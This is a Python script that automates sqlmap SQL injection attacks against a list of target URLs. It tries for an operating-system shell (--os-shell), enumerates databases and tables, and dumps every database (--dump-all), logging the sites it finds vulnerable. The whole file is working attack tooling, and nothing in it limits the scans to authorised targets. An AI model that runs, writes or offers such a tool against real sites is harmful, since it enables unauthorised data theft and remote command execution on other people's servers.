import subprocess
from urllib.parse import urlparse
import re
import os
from settings import TARGET_FILE_PATH, TARGET, TARGET_FILE_CHECK # type: ignore

tables_pattern = r"available databases\s*\[(\d+)\]"

# Ensure directory exists
def ensure_directory(path):
    if not os.path.exists(path):
        os.makedirs(path)

# Log results to sqlmapper_log
def log_result(url, status, details):
    log_dir = "log/sql_inj"
    ensure_directory(log_dir)
    log_file = os.path.join(log_dir, "sqlmapper_log")
    with open(log_file, "a") as f:
        f.write(f"URL: {url}\nStatus: {status}\nDetails: {details}\n{'-'*50}\n")

# Save vulnerable URLs to sqlmapper_scanner
def save_vulnerable_url(url):
    result_dir = "scan_results"
    ensure_directory(result_dir)
    result_file = os.path.join(result_dir, "sqlmapper_scanner")
    with open(result_file, "a") as f:
        f.write(f"{url}\n")

def get_urls():
    if TARGET_FILE_CHECK.lower() == "on":
        try:
            with open(TARGET_FILE_PATH, "r") as f:
                urls = [url.strip() for url in f.readlines()]
        except Exception as e:
            log_result("N/A", "ERROR", f"Failed to read TARGET_FILE_PATH: {str(e)}")
            return []
    else:
        urls = [TARGET.strip()]
    return urls

def os_shell():
    urls = get_urls()
    for url in urls:
        try:
            result = subprocess.run(["sqlmap", "-u", url, "-v3", "--batch", "--threads=10", "--os-shell", "--output-dir=sql"], capture_output=True, text=True)
            if "os-shell" in result.stdout.lower():
                save_vulnerable_url(url)
                log_result(url, "VULNERABLE", "OS Shell detected")
            else:
                log_result(url, "NOT VULNERABLE", "No OS Shell detected")
        except Exception as e:
            log_result(url, "ERROR", str(e))

def dbs():
    urls = get_urls()
    for url in urls:
        try:
            result = subprocess.run(["sqlmap", "-u", url, "-v3", "--batch", "--threads=10", "--dbs", "--output-dir=sql"], capture_output=True, text=True)
            if "available databases" in result.stdout.lower():
                save_vulnerable_url(url)
                log_result(url, "VULNERABLE", "Databases detected")
                tables(url)
            else:
                log_result(url, "NOT VULNERABLE", "No databases detected")
        except Exception as e:
            log_result(url, "ERROR", str(e))

def tables(url):
    isTable = False
    parsed_url = urlparse(url).netloc
    log_file = f"sql/{parsed_url}/log"
    try:
        with open(log_file, "r") as f:
            lines = f.readlines()
            for line in lines:
                match = re.search(tables_pattern, line)
                if isTable:
                    table = line.strip().replace("[*] ", "")
                    result = subprocess.run(["sqlmap", "-u", url, "-v3", "--batch", "--threads=10", "-D", table, "--tables", "--output-dir=sql"], capture_output=True, text=True)
                    log_result(url, "TABLE SCAN", f"Scanned tables for database: {table}")
                if match:
                    isTable = True
    except Exception as e:
        log_result(url, "ERROR", f"Table scan failed: {str(e)}")

def dumpall():
    urls = get_urls()
    for url in urls:
        try:
            result = subprocess.run(["sqlmap", "-u", url, "-v3", "--dump-all", "--batch", "--threads=10", "--output-dir=sql"], capture_output=True, text=True)
            if "dumping" in result.stdout.lower():
                save_vulnerable_url(url)
                log_result(url, "VULNERABLE", "Data dump successful")
            else:
                log_result(url, "NOT VULNERABLE", "No data dumped")
        except Exception as e:
            log_result(url, "ERROR", str(e))
